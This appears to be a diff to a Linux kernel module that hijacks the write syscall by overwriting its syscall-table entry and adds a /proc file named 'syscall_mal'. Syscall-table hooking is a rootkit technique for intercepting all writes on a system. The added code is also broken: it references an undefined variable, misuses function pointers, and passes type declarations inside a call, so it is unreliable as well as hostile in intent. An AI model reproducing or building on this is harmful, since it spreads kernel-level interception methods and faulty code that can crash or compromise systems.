@@ -23,10 +23,28 @@ MODULE_VERSION("0.1");
 #define SYSCALL_NI __NR_write
 
 static ulong *syscall_table = NULL;
-
 static void *original_syscall = NULL;
 
 asmlinkage int (*old_write)(int fildes, const void *buf, size_t nbytes);
+
+char *buff;
+int buff_length;
+//Proc File variables
+const char procFile[] = "syscall_mal";
+struct proc_dir_entry *proc_input;
+
+int procfile_read(char *buff,char **buff_location,
+	      off_t offset, int buffer_length, int *eof, void *data)
+{
+	int buff_size = buff_length;
+	if (offset > 0) {
+		buff_size  = 0;
+	} else {
+		buff_size = sprintf(buff, "HelloWorld!\n"); //Change
+	}
+
+	return buff_size;
+}
 
 static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
 {
@@ -37,6 +55,8 @@ static unsigned long new_write(int fildes, const void *buf, size_t nbytes)
                 return -EFAULT;
         }
         buffer[nbytes-1] = 0;
+
+        proc_input->read_proc = procfile_read(buff, NULL, 0, buff_length);
 
         return (*old_write)(int fildes, const void *buf, size_t nbytes);
 }
@@ -82,6 +102,16 @@ static void replace_syscall(ulong offset, ulong func_address)
 
 static int init_syscall(void)
 {
+        proc_input = create_proc_entry(procFile, 0644, NULL);
+        if (proc == NULL) {
+          remove_proc_entry(procFile, NULL);
+          return -ENOMEM;
+        }
+        proc_input->read_proc = procfile_read;
+        proc_input->mode = S_IFREG | S_IRUGO;
+        proc_input->uid = 0;
+        proc_input->gid = 0;
+        proc_input->size = 50;
         replace_syscall(SYSCALL_NI, (ulong)new_write);
         return 0;
 }
